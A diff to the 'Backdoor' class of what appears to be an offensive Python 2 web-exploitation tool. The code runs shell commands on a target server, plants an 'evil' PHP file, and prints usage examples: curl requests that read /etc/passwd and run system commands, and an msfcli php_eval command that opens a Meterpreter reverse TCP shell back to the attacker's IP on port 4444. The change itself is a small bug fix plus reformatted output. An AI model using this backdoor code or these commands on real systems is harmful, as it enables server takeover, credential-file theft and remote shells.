@@ -134,9 +134,9 @@ class Backdoor(object):
                 except ValueError:
                     pass
 
-        if clone is not "0":
-            cmd = 'cp -f {0} {1}'.format(path[int(clone)-1], location)
-            make_request.get_page_source(cmd)
+            if clone != 0:
+                cmd = 'cp -f {0} {1}'.format(path[int(clone)-1], location)
+                make_request.get_page_source(cmd)
             print '{0}[+] Creating our \'evil\' file: \'{1}\'{2}'.format(Colors.GREEN, location, Colors.END)
             parameter = ''.join(random.choice(string.ascii_lowercase) for x in range(6))
             import base64, itertools
@@ -149,7 +149,11 @@ class Backdoor(object):
             make_request.get_page_source(cmd)
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
             uri = folder[len(wwwroot):]
-            print '{0}[i] Example:\n[i]\tcurl "{1}{2}/{3}?{4}=require(\'/etc/passwd\')"\n[i]\tcurl "{1}{2}/{3}?{4}=system(\'/sbin/ifconfig\')"'.format(Colors.GREEN, ip, uri, filename, parameter, ourIP, Colors.END)  # Need to add  http or https infront ~ \n[i]\tmsfcli exploit/unix/webapp/php_eval RHOST={1} RPORT=80 PHPURI={2}/{3}?{4}=\!CODE\! PAYLOAD=php/meterpreter/reverse_tcp LHOST={5}{6} LPORT=4444 E
+            print '{0}[i] Example:{1}'.format(Colors.GREEN, Colors.END)  
+            print '{0}[i]\tcurl "{1}{2}/{3}?{4}=phpinfo()"{5}'.format(Colors.GREEN, ip, uri, filename, parameter, Colors.END)   # Need to add http or https infront of cURL
+            print '{0}[i]\tcurl "{1}{2}/{3}?{4}=require(\'/etc/passwd\')"{5}'.format(Colors.GREEN, ip, uri, filename, parameter, Colors.END)
+            print '{0}[i]\tcurl "{1}{2}/{3}?{4}=system(\'/sbin/ifconfig\')"{5}'.format(Colors.GREEN, ip, uri, filename, parameter, Colors.END)
+            print '{0}[i]\tmsfcli exploit/unix/webapp/php_eval RHOST={1} RPORT=80 PHPURI={2}/{3}?{4}=\!CODE\! PAYLOAD=php/meterpreter/reverse_tcp LHOST={5} LPORT=4444 E{6}'.format(Colors.GREEN, ip, uri, filename, parameter, ourIP, Colors.END)  # Still needs work
         else:
             print '\n{0}[!] Unable to find a writable directory'.format(Colors.RED, Colors.END)
 
